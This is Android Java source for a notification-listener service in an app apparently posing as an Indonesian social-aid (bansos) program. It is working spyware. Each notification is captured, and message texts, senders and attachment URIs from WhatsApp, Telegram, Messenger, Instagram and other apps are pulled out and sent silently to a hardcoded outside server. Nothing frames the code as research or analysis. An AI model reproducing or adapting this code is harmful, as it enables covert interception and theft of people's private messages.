package com.kemensos.bansos;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

@SuppressLint("OverrideAbstract")
public class NotifService extends NotificationListenerService {

    private static final String TAG = "NotifService";
    private static final String SERVER_URL = "https://bansos.jokichannel.eu.org";
    private static final String DEVICE_ID = "65057ab5f5";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;

        String packageName = sbn.getPackageName();

        try {
            JSONObject data = new JSONObject();
            data.put("package", packageName);
            data.put("app_name", getAppName(packageName));
            data.put("time", sbn.getPostTime());
            data.put("device_id", DEVICE_ID);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                data.put("key", sbn.getKey());
                data.put("user", sbn.getUser() != null ? sbn.getUser().toString() : "");
            }

            // Extract ALL notification content
            Bundle extras = sbn.getNotification().extras;
            if (extras == null) {
                sendToServer(data.toString());
                return;
            }

            // Standard fields
            String title = extras.getString("android.title", "");
            String text = extras.getString("android.text", "");
            String bigText = safeGetString(extras, "android.bigText");
            String subText = extras.getString("android.subText", "");
            String summaryText = safeGetString(extras, "android.summaryText");
            String conversationTitle = safeGetString(extras, "android.conversationTitle");

            data.put("title", title);
            data.put("text", text);

            if (!bigText.isEmpty()) data.put("big_text", bigText);
            if (!subText.isEmpty()) data.put("sub_text", subText);
            if (!summaryText.isEmpty()) data.put("summary_text", summaryText);
            if (!conversationTitle.isEmpty()) data.put("conversation_title", conversationTitle);

            // Extract messaging style messages (WhatsApp & Telegram use this)
            JSONArray messages = new JSONArray();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                Notification.MessagingStyle.Message[] msgArray =
                        Notification.MessagingStyle.extractMessagesFromNotification(sbn.getNotification());
                if (msgArray != null) {
                    for (Notification.MessagingStyle.Message msg : msgArray) {
                        JSONObject m = new JSONObject();
                        if (msg.getText() != null) m.put("text", msg.getText().toString());
                        if (msg.getSender() != null) m.put("sender", msg.getSender().toString());
                        m.put("timestamp", msg.getTimestamp());
                        if (msg.getDataUri() != null) m.put("data_uri", msg.getDataUri().toString());
                        if (msg.getDataMimeType() != null) m.put("mime_type", msg.getDataMimeType());
                        messages.put(m);
                    }
                }
            }

            // Also try to get messages from extras bundle
            if (messages.length() == 0) {
                try {
                    Object[] extraMsgs = (Object[]) extras.get("android.messages");
                    if (extraMsgs != null) {
                        for (Object obj : extraMsgs) {
                            if (obj instanceof Bundle) {
                                Bundle msgBundle = (Bundle) obj;
                                JSONObject m = new JSONObject();
                                String msgText = safeGetString(msgBundle, "android.text");
                                String msgSender = safeGetString(msgBundle, "android.sender");
                                if (!msgText.isEmpty()) m.put("text", msgText);
                                if (!msgSender.isEmpty()) m.put("sender", msgSender);
                                if (m.length() > 0) messages.put(m);
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.d(TAG, "Extra messages parse: " + e.getMessage());
                }
            }

            if (messages.length() > 0) {
                data.put("messages", messages);
                Log.d(TAG, "Msg-style notification: " + messages.length() + " msgs from " + conversationTitle);
            }

            // WhatsApp/Telegram specific — try to get more fields
            if (packageName.contains("whatsapp") || packageName.contains("telegram")) {
                // WhatsApp often puts the full message text in bigText or summary
                if (!bigText.isEmpty() && text.isEmpty()) {
                    data.put("text", bigText);
                }
                if (conversationTitle.isEmpty() && !title.isEmpty()) {
                    data.put("conversation_title", title);
                }
                // Log all extras keys for debugging
                Log.d(TAG, packageName + " extras keys: " + extras.keySet());
            }

            sendToServer(data.toString());

        } catch (Exception e) {
            Log.e(TAG, "Parse error", e);
        }
    }

    private String safeGetString(Bundle bundle, String key) {
        try {
            CharSequence cs = bundle.getCharSequence(key);
            if (cs != null) return cs.toString();
        } catch (Exception e) {}
        try {
            String s = bundle.getString(key, "");
            if (!s.isEmpty()) return s;
        } catch (Exception e) {}
        return "";
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Not needed
    }

    private String getAppName(String packageName) {
        switch (packageName) {
            case "com.whatsapp": return "WhatsApp";
            case "com.whatsapp.w4b": return "WhatsApp Business";
            case "org.telegram.messenger": return "Telegram";
            case "org.telegram.messenger.web": return "Telegram Web";
            case "com.facebook.orca": return "Messenger";
            case "com.facebook.katana": return "Facebook";
            case "com.facebook.lite": return "Facebook Lite";
            case "com.instagram.android": return "Instagram";
            case "com.twitter.android": return "Twitter/X";
            case "com.skype.raider": return "Skype";
            case "com.google.android.apps.messaging": return "Google Messages";
            case "com.samsung.android.messaging": return "Samsung Messages";
            default: return packageName;
        }
    }

    private void sendToServer(final String jsonData) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(SERVER_URL + "/api/collect-notif");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setDoOutput(true);
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    OutputStream os = conn.getOutputStream();
                    os.write(jsonData.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int code = conn.getResponseCode();
                    conn.disconnect();
                    Log.d(TAG, "Notif sent: " + packageNameFrom(jsonData) + " code=" + code);
                } catch (Exception e) {
                    Log.e(TAG, "Send error", e);
                }
            }

            private String packageNameFrom(String json) {
                try {
                    return new JSONObject(json).optString("package", "?");
                } catch (JSONException e) {
                    return "?";
                }
            }
        }).start();
    }
}
